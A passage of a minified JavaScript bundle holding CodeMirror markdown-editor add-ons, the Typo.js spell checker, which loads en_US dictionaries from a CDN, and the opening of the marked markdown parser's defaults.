Q.block==$&&l.indent?l.indent(Q.htmlState,k,se):Q.localState&&Q.localMode.indent?Q.localMode.indent(Q.localState,k,se):n.Pass},blankLine:B,getType:ne,blockCommentStart:"<!--",blockCommentEnd:"-->",closeBrackets:"()[]{}''\"\"``",fold:"markdown"};return We},"xml"),n.defineMIME("text/markdown","markdown"),n.defineMIME("text/x-markdown","markdown")})})();var W_=B_.exports,q_={exports:{}};(function(e,t){(function(n){n(kr)})(function(n){n.overlayMode=function(r,a,l){return{startState:function(){return{base:n.startState(r),overlay:n.startState(a),basePos:0,baseCur:null,overlayPos:0,overlayCur:null,streamSeen:null}},copyState:function(u){return{base:n.copyState(r,u.base),overlay:n.copyState(a,u.overlay),basePos:u.basePos,baseCur:null,overlayPos:u.overlayPos,overlayCur:null}},token:function(u,f){return(u!=f.streamSeen||Math.min(f.basePos,f.overlayPos)<u.start)&&(f.streamSeen=u,f.basePos=f.overlayPos=u.start),u.start==f.basePos&&(f.baseCur=r.token(u,f.base),f.basePos=u.pos),u.start==f.overlayPos&&(u.pos=u.start,f.overlayCur=a.token(u,f.overlay),f.overlayPos=u.pos),u.pos=Math.min(f.basePos,f.overlayPos),f.overlayCur==null?f.baseCur:f.baseCur!=null&&f.overlay.combineTokens||l&&f.overlay.combineTokens==null?f.baseCur+" "+f.overlayCur:f.overlayCur},indent:r.indent&&function(u,f,h){return r.indent(u.base,f,h)},electricChars:r.electricChars,innerMode:function(u){return{state:u.base,mode:r}},blankLine:function(u){var f,h;return r.blankLine&&(f=r.blankLine(u.base)),a.blankLine&&(h=a.blankLine(u.overlay)),h==null?f:l&&f!=null?f+" "+h:h}}}})})();var $_=q_.exports;(function(e,t){(function(n){n(kr)})(function(n){n.defineOption("placeholder","",function(m,x,g){var b=g&&g!=n.Init;if(x&&!b)m.on("blur",u),m.on("change",f),m.on("swapDoc",f),n.on(m.getInputField(),"compositionupdate",m.state.placeholderCompose=function(){l(m)}),f(m);else if(!x&&b){m.off("blur",u),m.off("change",f),m.off("swapDoc",f),n.off(m.getInputField(),"compositionupdate",m.state.placeholderCompose),r(m);var E=m.getWrapperElement();E.className=E.className.replace(" CodeMirror-empty","")}x&&!m.hasFocus()&&u(m)});function r(m){m.state.placeholder&&(m.state.placeholder.parentNode.removeChild(m.state.placeholder),m.state.placeholder=null)}function a(m){r(m);var x=m.state.placeholder=document.createElement("pre");x.style.cssText="height: 0; overflow: visible",x.style.direction=m.getOption("direction"),x.className="CodeMirror-placeholder CodeMirror-line-like";var g=m.getOption("placeholder");typeof g=="string"&&(g=document.createTextNode(g)),x.appendChild(g),m.display.lineSpace.insertBefore(x,m.display.lineSpace.firstChild)}function l(m){setTimeout(function(){var x=!1;if(m.lineCount()==1){var g=m.getInputField();x=g.nodeName=="TEXTAREA"?!m.getLine(0).length:!/[^\u200b]/.test(g.querySelector(".CodeMirror-line").textContent)}x?a(m):r(m)},20)}function u(m){h(m)&&a(m)}function f(m){var x=m.getWrapperElement(),g=h(m);x.className=x.className.replace(" CodeMirror-empty","")+(g?" CodeMirror-empty":""),g?a(m):r(m)}function h(m){return m.lineCount()===1&&m.getLine(0)===""}})})();(function(e,t){(function(n){n(kr)})(function(n){n.defineOption("autoRefresh",!1,function(l,u){l.state.autoRefresh&&(a(l,l.state.autoRefresh),l.state.autoRefresh=null),u&&l.display.wrapper.offsetHeight==0&&r(l,l.state.autoRefresh={delay:u.delay||250})});function r(l,u){function f(){l.display.wrapper.offsetHeight?(a(l,u),l.display.lastWrapHeight!=l.display.wrapper.clientHeight&&l.refresh()):u.timeout=setTimeout(f,u.delay)}u.timeout=setTimeout(f,u.delay),u.hurry=function(){clearTimeout(u.timeout),u.timeout=setTimeout(f,50)},n.on(window,"mouseup",u.hurry),n.on(window,"keyup",u.hurry)}function a(l,u){clearTimeout(u.timeout),n.off(window,"mouseup",u.hurry),n.off(window,"keyup",u.hurry)}})})();(function(e,t){(function(n){n(kr)})(function(n){n.defineOption("styleSelectedText",!1,function(b,E,C){var P=C&&C!=n.Init;E&&!P?(b.state.markedSelection=[],b.state.markedSelectionStyle=typeof E=="string"?E:"CodeMirror-selectedtext",x(b),b.on("cursorActivity",r),b.on("change",a)):!E&&P&&(b.off("cursorActivity",r),b.off("change",a),m(b),b.state.markedSelection=b.state.markedSelectionStyle=null)});function r(b){b.state.markedSelection&&b.operation(function(){g(b)})}function a(b){b.state.markedSelection&&b.state.markedSelection.length&&b.operation(function(){m(b)})}var l=8,u=n.Pos,f=n.cmpPos;function h(b,E,C,P){if(f(E,C)!=0)for(var O=b.state.markedSelection,N=b.state.markedSelectionStyle,T=E.line;;){var A=T==E.line?E:u(T,0),_=T+l,M=_>=C.line,R=M?C:u(_,0),B=b.markText(A,R,{className:N});if(P==null?O.push(B):O.splice(P++,0,B),M)break;T=_}}function m(b){for(var E=b.state.markedSelection,C=0;C<E.length;++C)E[C].clear();E.length=0}function x(b){m(b);for(var E=b.listSelections(),C=0;C<E.length;C++)h(b,E[C].from(),E[C].to())}function g(b){if(!b.somethingSelected())return m(b);if(b.listSelections().length>1)return x(b);var E=b.getCursor("start"),C=b.getCursor("end"),P=b.state.markedSelection;if(!P.length)return h(b,E,C);var O=P[0].find(),N=P[P.length-1].find();if(!O||!N||C.line-E.line<=l||f(E,N.to)>=0||f(C,O.from)<=0)return x(b);for(;f(E,O.from)>0;)P.shift().clear(),O=P[0].find();for(f(E,O.from)<0&&(O.to.line-E.line<l?(P.shift().clear(),h(b,E,O.to,0)):h(b,E,O.from,0));f(C,N.to)<0;)P.pop().clear(),N=P[P.length-1].find();f(C,N.to)>0&&(C.line-N.from.line<l?(P.pop().clear(),h(b,N.from,C)):h(b,N.to,C))}})})();(function(e,t){(function(n){n(kr)})(function(n){var r=n.Pos;function a(T){var A=T.flags;return A??(T.ignoreCase?"i":"")+(T.global?"g":"")+(T.multiline?"m":"")}function l(T,A){for(var _=a(T),M=_,R=0;R<A.length;R++)M.indexOf(A.charAt(R))==-1&&(M+=A.charAt(R));return _==M?T:new RegExp(T.source,M)}function u(T){return/\\s|\\n|\n|\\W|\\D|\[\^/.test(T.source)}function f(T,A,_){A=l(A,"g");for(var M=_.line,R=_.ch,B=T.lastLine();M<=B;M++,R=0){A.lastIndex=R;var U=T.getLine(M),$=A.exec(U);if($)return{from:r(M,$.index),to:r(M,$.index+$[0].length),match:$}}}function h(T,A,_){if(!u(A))return f(T,A,_);A=l(A,"gm");for(var M,R=1,B=_.line,U=T.lastLine();B<=U;){for(var $=0;$<R&&!(B>U);$++){var Y=T.getLine(B++);M=M==null?Y:M+`
`+Y}R=R*2,A.lastIndex=_.ch;var ne=A.exec(M);if(ne){var Z=M.slice(0,ne.index).split(`
`),me=ne[0].split(`
`),ye=_.line+Z.length-1,J=Z[Z.length-1].length;return{from:r(ye,J),to:r(ye+me.length-1,me.length==1?J+me[0].length:me[me.length-1].length),match:ne}}}}function m(T,A,_){for(var M,R=0;R<=T.length;){A.lastIndex=R;var B=A.exec(T);if(!B)break;var U=B.index+B[0].length;if(U>T.length-_)break;(!M||U>M.index+M[0].length)&&(M=B),R=B.index+1}return M}function x(T,A,_){A=l(A,"g");for(var M=_.line,R=_.ch,B=T.firstLine();M>=B;M--,R=-1){var U=T.getLine(M),$=m(U,A,R<0?0:U.length-R);if($)return{from:r(M,$.index),to:r(M,$.index+$[0].length),match:$}}}function g(T,A,_){if(!u(A))return x(T,A,_);A=l(A,"gm");for(var M,R=1,B=T.getLine(_.line).length-_.ch,U=_.line,$=T.firstLine();U>=$;){for(var Y=0;Y<R&&U>=$;Y++){var ne=T.getLine(U--);M=M==null?ne:ne+`
`+M}R*=2;var Z=m(M,A,B);if(Z){var me=M.slice(0,Z.index).split(`
`),ye=Z[0].split(`
`),J=U+me.length,pe=me[me.length-1].length;return{from:r(J,pe),to:r(J+ye.length-1,ye.length==1?pe+ye[0].length:ye[ye.length-1].length),match:Z}}}}var b,E;String.prototype.normalize?(b=function(T){return T.normalize("NFD").toLowerCase()},E=function(T){return T.normalize("NFD")}):(b=function(T){return T.toLowerCase()},E=function(T){return T});function C(T,A,_,M){if(T.length==A.length)return _;for(var R=0,B=_+Math.max(0,T.length-A.length);;){if(R==B)return R;var U=R+B>>1,$=M(T.slice(0,U)).length;if($==_)return U;$>_?B=U:R=U+1}}function P(T,A,_,M){if(!A.length)return null;var R=M?b:E,B=R(A).split(/\r|\n\r?/);e:for(var U=_.line,$=_.ch,Y=T.lastLine()+1-B.length;U<=Y;U++,$=0){var ne=T.getLine(U).slice($),Z=R(ne);if(B.length==1){var me=Z.indexOf(B[0]);if(me==-1)continue e;var _=C(ne,Z,me,R)+$;return{from:r(U,C(ne,Z,me,R)+$),to:r(U,C(ne,Z,me+B[0].length,R)+$)}}else{var ye=Z.length-B[0].length;if(Z.slice(ye)!=B[0])continue e;for(var J=1;J<B.length-1;J++)if(R(T.getLine(U+J))!=B[J])continue e;var pe=T.getLine(U+B.length-1),oe=R(pe),ae=B[B.length-1];if(oe.slice(0,ae.length)!=ae)continue e;return{from:r(U,C(ne,Z,ye,R)+$),to:r(U+B.length-1,C(pe,oe,ae.length,R))}}}}function O(T,A,_,M){if(!A.length)return null;var R=M?b:E,B=R(A).split(/\r|\n\r?/);e:for(var U=_.line,$=_.ch,Y=T.firstLine()-1+B.length;U>=Y;U--,$=-1){var ne=T.getLine(U);$>-1&&(ne=ne.slice(0,$));var Z=R(ne);if(B.length==1){var me=Z.lastIndexOf(B[0]);if(me==-1)continue e;return{from:r(U,C(ne,Z,me,R)),to:r(U,C(ne,Z,me+B[0].length,R))}}else{var ye=B[B.length-1];if(Z.slice(0,ye.length)!=ye)continue e;for(var J=1,_=U-B.length+1;J<B.length-1;J++)if(R(T.getLine(_+J))!=B[J])continue e;var pe=T.getLine(U+1-B.length),oe=R(pe);if(oe.slice(oe.length-B[0].length)!=B[0])continue e;return{from:r(U+1-B.length,C(pe,oe,pe.length-B[0].length,R)),to:r(U,C(ne,Z,ye.length,R))}}}}function N(T,A,_,M){this.atOccurrence=!1,this.afterEmptyMatch=!1,this.doc=T,_=_?T.clipPos(_):r(0,0),this.pos={from:_,to:_};var R;typeof M=="object"?R=M.caseFold:(R=M,M=null),typeof A=="string"?(R==null&&(R=!1),this.matches=function(B,U){return(B?O:P)(T,A,U,R)}):(A=l(A,"gm"),!M||M.multiline!==!1?this.matches=function(B,U){return(B?g:h)(T,A,U)}:this.matches=function(B,U){return(B?x:f)(T,A,U)})}N.prototype={findNext:function(){return this.find(!1)},findPrevious:function(){return this.find(!0)},find:function(T){var A=this.doc.clipPos(T?this.pos.from:this.pos.to);if(this.afterEmptyMatch&&this.atOccurrence&&(A=r(A.line,A.ch),T?(A.ch--,A.ch<0&&(A.line--,A.ch=(this.doc.getLine(A.line)||"").length)):(A.ch++,A.ch>(this.doc.getLine(A.line)||"").length&&(A.ch=0,A.line++)),n.cmpPos(A,this.doc.clipPos(A))!=0))return this.atOccurrence=!1;var _=this.matches(T,A);if(this.afterEmptyMatch=_&&n.cmpPos(_.from,_.to)==0,_)return this.pos=_,this.atOccurrence=!0,this.pos.match||!0;var M=r(T?this.doc.firstLine():this.doc.lastLine()+1,0);return this.pos={from:M,to:M},this.atOccurrence=!1},from:function(){if(this.atOccurrence)return this.pos.from},to:function(){if(this.atOccurrence)return this.pos.to},replace:function(T,A){if(this.atOccurrence){var _=n.splitLines(T);this.doc.replaceRange(_,this.pos.from,this.pos.to,A),this.pos.to=r(this.pos.from.line+_.length-1,_[_.length-1].length+(_.length==1?this.pos.from.ch:0))}}},n.defineExtension("getSearchCursor",function(T,A,_){return new N(this.doc,T,A,_)}),n.defineDocExtension("getSearchCursor",function(T,A,_){return new N(this,T,A,_)}),n.defineExtension("selectMatches",function(T,A){for(var _=[],M=this.getSearchCursor(T,this.getCursor("from"),A);M.findNext()&&!(n.cmpPos(M.to(),this.getCursor("to"))>0);)_.push({anchor:M.from(),head:M.to()});_.length&&this.setSelections(_,0)})})})();(function(e,t){(function(n){n(kr,W_,$_)})(function(n){var r=/^((?:(?:aaas?|about|acap|adiumxtra|af[ps]|aim|apt|attachment|aw|beshare|bitcoin|bolo|callto|cap|chrome(?:-extension)?|cid|coap|com-eventbrite-attendee|content|crid|cvs|data|dav|dict|dlna-(?:playcontainer|playsingle)|dns|doi|dtn|dvb|ed2k|facetime|feed|file|finger|fish|ftp|geo|gg|git|gizmoproject|go|gopher|gtalk|h323|hcp|https?|iax|icap|icon|im|imap|info|ipn|ipp|irc[6s]?|iris(?:\.beep|\.lwz|\.xpc|\.xpcs)?|itms|jar|javascript|jms|keyparc|lastfm|ldaps?|magnet|mailto|maps|market|message|mid|mms|ms-help|msnim|msrps?|mtqp|mumble|mupdate|mvn|news|nfs|nih?|nntp|notes|oid|opaquelocktoken|palm|paparazzi|platform|pop|pres|proxy|psyc|query|res(?:ource)?|rmi|rsync|rtmp|rtsp|secondlife|service|session|sftp|sgn|shttp|sieve|sips?|skype|sm[bs]|snmp|soap\.beeps?|soldat|spotify|ssh|steam|svn|tag|teamspeak|tel(?:net)?|tftp|things|thismessage|tip|tn3270|tv|udp|unreal|urn|ut2004|vemmi|ventrilo|view-source|webcal|wss?|wtai|wyciwyg|xcon(?:-userid)?|xfire|xmlrpc\.beeps?|xmpp|xri|ymsgr|z39\.50[rs]?):(?:\/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]|\([^\s()<>]*\))+(?:\([^\s()<>]*\)|[^\s`*!()\[\]{};:'".,<>?]))/i;n.defineMode("gfm",function(a,l){var u=0;function f(g){return g.code=!1,null}var h={startState:function(){return{code:!1,codeBlock:!1,ateSpace:!1}},copyState:function(g){return{code:g.code,codeBlock:g.codeBlock,ateSpace:g.ateSpace}},token:function(g,b){if(b.combineTokens=null,b.codeBlock)return g.match(/^```+/)?(b.codeBlock=!1,null):(g.skipToEnd(),null);if(g.sol()&&(b.code=!1),g.sol()&&g.match(/^```+/))return g.skipToEnd(),b.codeBlock=!0,null;if(g.peek()==="`"){g.next();var E=g.pos;g.eatWhile("`");var C=1+g.pos-E;return b.code?C===u&&(b.code=!1):(u=C,b.code=!0),null}else if(b.code)return g.next(),null;if(g.eatSpace())return b.ateSpace=!0,null;if((g.sol()||b.ateSpace)&&(b.ateSpace=!1,l.gitHubSpice!==!1)){if(g.match(/^(?:[a-zA-Z0-9\-_]+\/)?(?:[a-zA-Z0-9\-_]+@)?(?=.{0,6}\d)(?:[a-f0-9]{7,40}\b)/))return b.combineTokens=!0,"link";if(g.match(/^(?:[a-zA-Z0-9\-_]+\/)?(?:[a-zA-Z0-9\-_]+)?#[0-9]+\b/))return b.combineTokens=!0,"link"}return g.match(r)&&g.string.slice(g.start-2,g.start)!="]("&&(g.start==0||/\W/.test(g.string.charAt(g.start-1)))?(b.combineTokens=!0,"link"):(g.next(),null)},blankLine:f},m={taskLists:!0,strikethrough:!0,emoji:!0};for(var x in l)m[x]=l[x];return m.name="markdown",n.overlayMode(n.getMode(a,m),h)},"markdown"),n.defineMIME("text/x-gfm","gfm")})})();function Y_(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var Ck={exports:{}};const V_={},G_=Object.freeze(Object.defineProperty({__proto__:null,default:V_},Symbol.toStringTag,{value:"Module"})),Q_=QN(G_);(function(e){var t;(function(){t=function(n,r,a,l){l=l||{},this.dictionary=null,this.rules={},this.dictionaryTable={},this.compoundRules=[],this.compoundRuleCodes={},this.replacementTable=[],this.flags=l.flags||{},this.memoized={},this.loaded=!1;var u=this,f,h,m,x,g;if(n)if(u.dictionary=n,r&&a)O();else if(typeof window<"u"&&(window.chrome&&window.chrome.runtime||window.browser&&window.browser.runtime)){var b=window.chrome&&window.chrome.runtime?window.chrome.runtime:window.browser.runtime;l.dictionaryPath?f=l.dictionaryPath:f="typo/dictionaries",r||E(b.getURL(f+"/"+n+"/"+n+".aff"),C),a||E(b.getURL(f+"/"+n+"/"+n+".dic"),P)}else l.dictionaryPath?f=l.dictionaryPath:typeof __dirname<"u"?f=__dirname+"/dictionaries":f="./dictionaries",r||E(f+"/"+n+"/"+n+".aff",C),a||E(f+"/"+n+"/"+n+".dic",P);function E(N,T){var A=u._readFile(N,null,l==null?void 0:l.asyncLoad);l!=null&&l.asyncLoad?A.then(function(_){T(_)}):T(A)}function C(N){r=N,a&&O()}function P(N){a=N,r&&O()}function O(){for(u.rules=u._parseAFF(r),u.compoundRuleCodes={},h=0,x=u.compoundRules.length;h<x;h++){var N=u.compoundRules[h];for(m=0,g=N.length;m<g;m++)u.compoundRuleCodes[N[m]]=[]}"ONLYINCOMPOUND"in u.flags&&(u.compoundRuleCodes[u.flags.ONLYINCOMPOUND]=[]),u.dictionaryTable=u._parseDIC(a);for(h in u.compoundRuleCodes)u.compoundRuleCodes[h].length===0&&delete u.compoundRuleCodes[h];for(h=0,x=u.compoundRules.length;h<x;h++){var T=u.compoundRules[h],A="";for(m=0,g=T.length;m<g;m++){var _=T[m];_ in u.compoundRuleCodes?A+="("+u.compoundRuleCodes[_].join("|")+")":A+=_}u.compoundRules[h]=new RegExp("^"+A+"$","i")}u.loaded=!0,l!=null&&l.asyncLoad&&(l!=null&&l.loadedCallback)&&l.loadedCallback(u)}return this},t.prototype={load:function(n){for(var r in n)n.hasOwnProperty(r)&&(this[r]=n[r]);return this},_readFile:function(n,r,a){var l;if(r=r||"utf8",typeof XMLHttpRequest<"u"){var u=new XMLHttpRequest;if(u.open("GET",n,!!a),(l=u.overrideMimeType)===null||l===void 0||l.call(u,"text/plain; charset="+r),a){var f=new Promise(function(m,x){u.onload=function(){u.status===200?m(u.responseText):x(u.statusText)},u.onerror=function(){x(u.statusText)}});return u.send(null),f}else return u.send(null),u.responseText}else if(typeof Y_<"u"){var h=Q_;try{if(h.existsSync(n))return h.readFileSync(n,r);console.log("Path "+n+" does not exist.")}catch(m){console.log(m)}return""}return""},_parseAFF:function(n){var r={},a,l,u,f,h,m,x,g,b=n.split(/\r?\n/);for(h=0,x=b.length;h<x;h++)if(a=this._removeAffixComments(b[h]),a=a.trim(),!!a){var E=a.split(/\s+/),C=E[0];if(C==="PFX"||C==="SFX"){var P=E[1],O=E[2];u=parseInt(E[3],10);var N=[];for(m=h+1,g=h+1+u;m<g;m++){l=b[m],f=l.split(/\s+/);var T=f[2],A=f[3].split("/"),_=A[0];_==="0"&&(_="");var M=this.parseRuleCodes(A[1]),R=f[4],B={add:_};M.length>0&&(B.continuationClasses=M),R!=="."&&(C==="SFX"?B.match=new RegExp(R+"$"):B.match=new RegExp("^"+R)),T!="0"&&(C==="SFX"?B.remove=new RegExp(T+"$"):B.remove=T),N.push(B)}r[P]={type:C,combineable:O==="Y",entries:N},h+=u}else if(C==="COMPOUNDRULE"){for(u=parseInt(E[1],10),m=h+1,g=h+1+u;m<g;m++)a=b[m],f=a.split(/\s+/),this.compoundRules.push(f[1]);h+=u}else C==="REP"?(f=a.split(/\s+/),f.length===3&&this.replacementTable.push([f[1],f[2]])):this.flags[C]=E[1]}return r},_removeAffixComments:function(n){return n.match(/^\s*#/)?"":n},_parseDIC:function(n){n=this._removeDicComments(n);var r=n.split(/\r?\n/),a={};function l(Z,me){a.hasOwnProperty(Z)||(a[Z]=null),me.length>0&&(a[Z]===null&&(a[Z]=[]),a[Z].push(me))}for(var u=1,f=r.length;u<f;u++){var h=r[u];if(h){var m=h.replace(/\s.*$/,""),x=m.split("/",2),g=x[0];if(x.length>1){var b=this.parseRuleCodes(x[1]);(!("NEEDAFFIX"in this.flags)||b.indexOf(this.flags.NEEDAFFIX)===-1)&&l(g,b);for(var E=0,C=b.length;E<C;E++){var P=b[E],O=this.rules[P];if(O)for(var N=this._applyRule(g,O),T=0,A=N.length;T<A;T++){var _=N[T];if(l(_,[]),O.combineable)for(var M=E+1;M<C;M++){var R=b[M],B=this.rules[R];if(B&&B.combineable&&O.type!=B.type)for(var U=this._applyRule(_,B),$=0,Y=U.length;$<Y;$++){var ne=U[$];l(ne,[])}}}P in this.compoundRuleCodes&&this.compoundRuleCodes[P].push(g)}}else l(g.trim(),[])}}return a},_removeDicComments:function(n){return n=n.replace(/^\t.*$/mg,""),n},parseRuleCodes:function(n){if(n)if("FLAG"in this.flags)if(this.flags.FLAG==="long"){for(var r=[],a=0,l=n.length;a<l;a+=2)r.push(n.substr(a,2));return r}else return this.flags.FLAG==="num"?n.split(","):this.flags.FLAG==="UTF-8"?Array.from(n):n.split("");else return n.split("");else return[]},_applyRule:function(n,r){for(var a=r.entries,l=[],u=0,f=a.length;u<f;u++){var h=a[u];if(!h.match||n.match(h.match)){var m=n;if(h.remove&&(m=m.replace(h.remove,"")),r.type==="SFX"?m=m+h.add:m=h.add+m,l.push(m),"continuationClasses"in h)for(var x=0,g=h.continuationClasses.length;x<g;x++){var b=this.rules[h.continuationClasses[x]];b&&(l=l.concat(this._applyRule(m,b)))}}}return l},check:function(n){if(!this.loaded)throw"Dictionary not loaded.";if(!n)return!1;var r=n.replace(/^\s\s*/,"").replace(/\s\s*$/,"");if(this.checkExact(r))return!0;if(r.toUpperCase()===r){var a=r[0]+r.substring(1).toLowerCase();if(this.hasFlag(a,"KEEPCASE"))return!1;if(this.checkExact(a)||this.checkExact(r.toLowerCase()))return!0}var l=r[0].toLowerCase()+r.substring(1);if(l!==r){if(this.hasFlag(l,"KEEPCASE"))return!1;if(this.checkExact(l))return!0}return!1},checkExact:function(n){if(!this.loaded)throw"Dictionary not loaded.";var r=this.dictionaryTable[n],a,l;if(typeof r>"u"){if("COMPOUNDMIN"in this.flags&&n.length>=this.flags.COMPOUNDMIN){for(a=0,l=this.compoundRules.length;a<l;a++)if(n.match(this.compoundRules[a]))return!0}}else{if(r===null)return!0;if(typeof r=="object"){for(a=0,l=r.length;a<l;a++)if(!this.hasFlag(n,"ONLYINCOMPOUND",r[a]))return!0}}return!1},hasFlag:function(n,r,a){if(!this.loaded)throw"Dictionary not loaded.";return!!(r in this.flags&&(typeof a>"u"&&(a=Array.prototype.concat.apply([],this.dictionaryTable[n])),a&&a.indexOf(this.flags[r])!==-1))},alphabet:"",suggest:function(n,r){if(!this.loaded)throw"Dictionary not loaded.";if(r=r||5,this.memoized.hasOwnProperty(n)){var a=this.memoized[n].limit;if(r<=a||this.memoized[n].suggestions.length<a)return this.memoized[n].suggestions.slice(0,r)}if(this.check(n))return[];for(var l=0,u=this.replacementTable.length;l<u;l++){var f=this.replacementTable[l];if(n.indexOf(f[0])!==-1){var h=n.replace(f[0],f[1]);if(this.check(h))return[h]}}if(!this.alphabet){this.alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ","TRY"in this.flags&&(this.alphabet+=this.flags.TRY),"WORDCHARS"in this.flags&&(this.alphabet+=this.flags.WORDCHARS);var m=this.alphabet.split("");m.sort();for(var x={},l=0;l<m.length;l++)x[m[l]]=!0;this.alphabet="";for(var l in x)this.alphabet+=l}var g=this;function b(C,P){var O={},N,T,A,_,M=g.alphabet.length;for(var R in C)for(N=0,A=R.length+1;N<A;N++){var B=[R.substring(0,N),R.substring(N)];if(B[1]&&(_=B[0]+B[1].substring(1),(!P||g.check(_))&&(_ in O?O[_]+=1:O[_]=1)),B[1].length>1&&B[1][1]!==B[1][0]&&(_=B[0]+B[1][1]+B[1][0]+B[1].substring(2),(!P||g.check(_))&&(_ in O?O[_]+=1:O[_]=1)),B[1]){var U=B[1].substring(0,1).toUpperCase()===B[1].substring(0,1)?"uppercase":"lowercase";for(T=0;T<M;T++){var $=g.alphabet[T];U==="uppercase"&&($=$.toUpperCase()),$!=B[1].substring(0,1)&&(_=B[0]+$+B[1].substring(1),(!P||g.check(_))&&(_ in O?O[_]+=1:O[_]=1))}}if(B[1])for(T=0;T<M;T++){var U=B[0].substring(-1).toUpperCase()===B[0].substring(-1)&&B[1].substring(0,1).toUpperCase()===B[1].substring(0,1)?"uppercase":"lowercase",$=g.alphabet[T];U==="uppercase"&&($=$.toUpperCase()),_=B[0]+$+B[1],(!P||g.check(_))&&(_ in O?O[_]+=1:O[_]=1)}}return O}function E(C){var P,O=b((P={},P[C]=!0,P)),N=b(O,!0),T=N;for(var A in O)g.check(A)&&(A in T?T[A]+=O[A]:T[A]=O[A]);var _,M=[];for(_ in T)T.hasOwnProperty(_)&&(g.hasFlag(_,"PRIORITYSUGGEST")&&(T[_]+=1e3),M.push([_,T[_]]));function R(Y,ne){var Z=Y[1],me=ne[1];return Z<me?-1:Z>me?1:ne[0].localeCompare(Y[0])}M.sort(R).reverse();var B=[],U="lowercase";C.toUpperCase()===C?U="uppercase":C.substr(0,1).toUpperCase()+C.substr(1).toLowerCase()===C&&(U="capitalized");var $=r;for(_=0;_<Math.min($,M.length);_++)U==="uppercase"?M[_][0]=M[_][0].toUpperCase():U==="capitalized"&&(M[_][0]=M[_][0].substr(0,1).toUpperCase()+M[_][0].substr(1)),!g.hasFlag(M[_][0],"NOSUGGEST")&&B.indexOf(M[_][0])===-1?B.push(M[_][0]):$++;return B}return this.memoized[n]={suggestions:E(n),limit:r},this.memoized[n].suggestions}}})(),e.exports=t})(Ck);var K_=Ck.exports,ib=K_;function Ot(e){if(e=e||{},typeof e.codeMirrorInstance!="function"||typeof e.codeMirrorInstance.defineMode!="function"){console.log("CodeMirror Spell Checker: You must provide an instance of CodeMirror via the option `codeMirrorInstance`");return}String.prototype.includes||(String.prototype.includes=function(){return String.prototype.indexOf.apply(this,arguments)!==-1}),e.codeMirrorInstance.defineMode("spell-checker",function(t){if(!Ot.aff_loading){Ot.aff_loading=!0;var n=new XMLHttpRequest;n.open("GET","https://cdn.jsdelivr.net/codemirror.spell-checker/latest/en_US.aff",!0),n.onload=function(){n.readyState===4&&n.status===200&&(Ot.aff_data=n.responseText,Ot.num_loaded++,Ot.num_loaded==2&&(Ot.typo=new ib("en_US",Ot.aff_data,Ot.dic_data,{platform:"any"})))},n.send(null)}if(!Ot.dic_loading){Ot.dic_loading=!0;var r=new XMLHttpRequest;r.open("GET","https://cdn.jsdelivr.net/codemirror.spell-checker/latest/en_US.dic",!0),r.onload=function(){r.readyState===4&&r.status===200&&(Ot.dic_data=r.responseText,Ot.num_loaded++,Ot.num_loaded==2&&(Ot.typo=new ib("en_US",Ot.aff_data,Ot.dic_data,{platform:"any"})))},r.send(null)}var a='!"#$%&()*+,-./:;<=>?@[\\]^_`{|}~ ',l={token:function(f){var h=f.peek(),m="";if(a.includes(h))return f.next(),null;for(;(h=f.peek())!=null&&!a.includes(h);)m+=h,f.next();return Ot.typo&&!Ot.typo.check(m)?"spell-error":null}},u=e.codeMirrorInstance.getMode(t,t.backdrop||"text/plain");return e.codeMirrorInstance.overlayMode(u,l,!0)})}Ot.num_loaded=0;Ot.aff_loading=!1;Ot.dic_loading=!1;Ot.aff_data="";Ot.dic_data="";Ot.typo;var X_=Ot,Sk={};(function(e){function t(le,ue){for(var H=0;H<ue.length;H++){var L=ue[H];L.enumerable=L.enumerable||!1,L.configurable=!0,"value"in L&&(L.writable=!0),Object.defineProperty(le,h(L.key),L)}}function n(le,ue,H){return H&&t(le,H),Object.defineProperty(le,"prototype",{writable:!1}),le}function r(){return r=Object.assign?Object.assign.bind():function(le){for(var ue=1;ue<arguments.length;ue++){var H=arguments[ue];for(var L in H)Object.prototype.hasOwnProperty.call(H,L)&&(le[L]=H[L])}return le},r.apply(this,arguments)}function a(le,ue){if(le){if(typeof le=="string")return l(le,ue);var H=Object.prototype.toString.call(le).slice(8,-1);if(H==="Object"&&le.constructor&&(H=le.constructor.name),H==="Map"||H==="Set")return Array.from(le);if(H==="Arguments"||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(H))return l(le,ue)}}function l(le,ue){(ue==null||ue>le.length)&&(ue=le.length);for(var H=0,L=new Array(ue);H<ue;H++)L[H]=le[H];return L}function u(le,ue){var H=typeof Symbol<"u"&&le[Symbol.iterator]||le["@@iterator"];if(H)return(H=H.call(le)).next.bind(H);if(Array.isArray(le)||(H=a(le))||ue){H&&(le=H);var L=0;return function(){return L>=le.length?{done:!0}:{done:!1,value:le[L++]}}}throw new TypeError(`Invalid attempt to iterate non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)}function f(le,ue){if(typeof le!="object"||le===null)return le;var H=le[Symbol.toPrimitive];if(H!==void 0){var L=H.call(le,ue);if(typeof L!="object")return L;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(le)}function h(le){var ue=f(le,"string");return typeof ue=="symbol"?ue:String(ue)}function m(){return{async:!1,baseUrl:null,breaks:!1,extensions:null,gfm:!0,headerIds:!0,headerPrefix:"",highlight:null,hooks:null,langPrefix:"language-",mangle:!0,pedantic:!1,renderer:null,sanitize:!1,sanitizer:null,silent:!1,smartypants:!1,tokenizer:null,walkTokens:null,xhtml:!1}}e.defaults=m();function x(le){e.defaults=le}var g=/[&<>"']/,b=new RegExp(g.source,"g"),E=/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,C=new RegExp(E.source,"g"),P={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},O=function(ue){return P[ue]};function N(le,ue){if(ue){if(g.test(le))return le.replace(b,O)}else if(E.test(le))return le.replace(C,O);return le}var T=/&(#(?:\d+)|(?:#x[0-9A-Fa-f]+)|(?:\w+));?/ig;function A(le){return le.replace(T,function(ue,H){return 